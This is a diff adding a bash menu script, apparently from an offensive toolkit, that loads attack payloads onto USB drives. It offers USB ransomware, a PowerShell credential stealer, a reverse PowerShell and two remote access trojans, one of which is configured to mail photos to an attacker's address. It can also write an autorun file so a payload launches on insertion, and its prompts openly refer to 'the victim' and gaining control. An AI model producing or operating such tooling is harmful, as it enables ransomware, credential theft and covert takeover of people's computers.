@@ -1,0 +1,165 @@
+#!/bin/bash
+
+readonly OFSPRING_FILE="/source/offspring.txt"
+readonly LICENSE_FILE="/root/.f/license.txt"
+readonly USB_RANSOM_SRC_DIR="/source/USB-Ransom"
+readonly RAT_SRC_DIR="/source/RATmail"
+readonly REVERSE_DIR="/source/reverse"
+readonly RATSERVER="/source/RAT"
+readonly MEDIA_DIR="/media/newland"
+readonly MENU_PROMPT="off> "
+readonly MENU_BACK_OPTION="menu"
+readonly MENU_EXIT_OPTION="exit"
+readonly ONE_PROMPT="off/usb> "
+readonly TXT="/root/.f/01.txt"
+readonly POWERSHELL_STEALER="/source/stealer"
+
+print_file_content() {
+    clear
+    cat "$OFSPRING_FILE"
+}
+
+print_welcome_message() {
+    zsh /source/welcome.sh
+}
+
+print_menu() {
+    cat <<EOF
+    Menu:
+
+    1) Flash-USB Tools;
+
+    99) Exit
+
+EOF
+}
+
+print_modules_menu() {
+    cat <<EOF
+
+    Choose an option
+    to automate:
+
+    1) USB-RansomWare;
+    2) Powershell Credential Thief;
+    3) Reverse Powershell;
+    4) Remote Access Trojan via G-Mail;
+    5) Remote Access Trojan via Server;
+
+    99) Back
+
+EOF
+    read -p "$ONE_PROMPT" option_module
+}
+
+copy_content_to_pendrive() {
+    clear
+    echo -e "\n$(cat "$OFSPRING_FILE")"
+    cat /source/"$option_module".txt
+    list_pendrives
+    echo ""
+    read -p "off/usb/> " pendrive_number
+
+    if (( pendrive_number >= 0 )) && (( pendrive_number < ${#pendrives[@]} )); then
+        selected_pendrive="$MEDIA_DIR/$(basename "${pendrives[$pendrive_number]}")"
+
+        if [ -d "$selected_pendrive" ]; then
+            read -p "off/usb/conf> Do you want to delete pre-existing files in $selected_pendrive? (yes/no): " delete_existing_files
+
+            if [ "$delete_existing_files" = "yes" ]; then
+                rm -r "$selected_pendrive"/*
+                echo -e "[#] Pre-existing files deleted in $selected_pendrive\n"
+            fi
+
+            case $option_module in
+                1) cp -r "$USB_RANSOM_SRC_DIR"/* "$selected_pendrive" ;;
+		2) cp -r "$POWERSHELL_STEALER"/* "$selected_pendrive"
+		   echo "[#] Powershell Payload activated."
+		   ;;
+		3) cp -r "$REVERSE_DIR"/* "$selected_pendrive"
+                    echo -n -e "[#] The Trojan will be accessible via the internet."
+                    echo -e "\n[#] Access the victim's internal IP address to gain control."
+                    echo -e "[#] For the victim, it will be accessible at http://127.0.0.1:80"
+		    ;;
+                4)
+                    cp -r "$RAT_SRC_DIR"/* "$selected_pendrive"
+                    echo -e "\$username=$(read -p "off/usb/conf/email> Enter the email to be used for sending messages: " email; echo $email)" >> "$selected_pendrive"/Mail.ps1
+                    echo -e "\$password=$(read -p "off/usb/conf/password> Enter the email password: " password; echo $password)" >> "$selected_pendrive"/Mail.ps1
+                    echo -e "\$msg.To.Add=$(read -p "off/usb/conf/receiver> Enter the email to which the photos should be sent: " recipient; echo $recipient)" >> "$selected_pendrive"/Mail.ps1
+                    ;;
+                5)
+                    cp -r "$RATSERVER"/* "$selected_pendrive"
+                    echo -n -e "[#] The Trojan will be accessible via the internet."
+                    echo -e "\n[#] Access the victim's internal IP address to gain control."
+                    echo -e "[#] For the victim, it will be accessible at http://127.0.0.1:80"
+                    ;;
+                *)
+                    echo "Invalid option"
+                    ;;
+            esac
+
+            echo -e "[#] Content and payload copied to $selected_pendrive\n"
+            read -p "off/usb/conf> Do you want to create an autorun.info payload? (yes/no): " create_autorun
+
+            if [ "$create_autorun" = "yes" ]; then
+                echo -e ""
+                read -p "off/usb/conf/autorun.info> Enter the main file name: " main_file_name
+                echo -e "OPEN=$main_file_name" > "$selected_pendrive/autorun.info"
+                echo -e "[#] autorun.info file created in $selected_pendrive"
+            fi
+
+            read -p "off/system> Do you want to go back to the main menu or exit? ($MENU_BACK_OPTION/$MENU_EXIT_OPTION): " back_option
+            case $back_option in
+                "$MENU_BACK_OPTION") return ;;
+                "$MENU_EXIT_OPTION")
+                    echo "Exiting..."
+                    exit 0
+                    ;;
+                *) echo "Invalid option, returning to the main menu." ;;
+            esac
+        else
+            echo "Invalid pendrive"
+        fi
+    else
+        echo "Invalid pendrive number"
+    fi
+}
+
+list_pendrives() {
+    echo -e "\n  Select a pendrive:"
+    echo -e "\n"
+    pendrives=("$MEDIA_DIR/"*)
+
+    if [ ${#pendrives[@]} -eq 0 ]; then
+        echo "No pendrive found in $MEDIA_DIR."
+        exit 1
+    fi
+
+    for i in "${!pendrives[@]}"; do
+        echo -e "\t$i) $(basename "${pendrives[$i]}")"
+    done
+}
+
+while true; do
+    print_file_content
+    print_welcome_message
+    print_menu
+
+    read -p "$MENU_PROMPT" option
+
+    case $option in
+        1)
+            print_modules_menu
+            case $option_module in
+                1 | 2 | 3 | 4 | 5) copy_content_to_pendrive ;;
+                99) ;;
+                *) echo "Invalid option" ;;
+            esac
+            ;;
+        99)
+            echo "Exiting..."
+            exit 0
+            ;;
+        *) echo "Invalid option" ;;
+    esac
+done
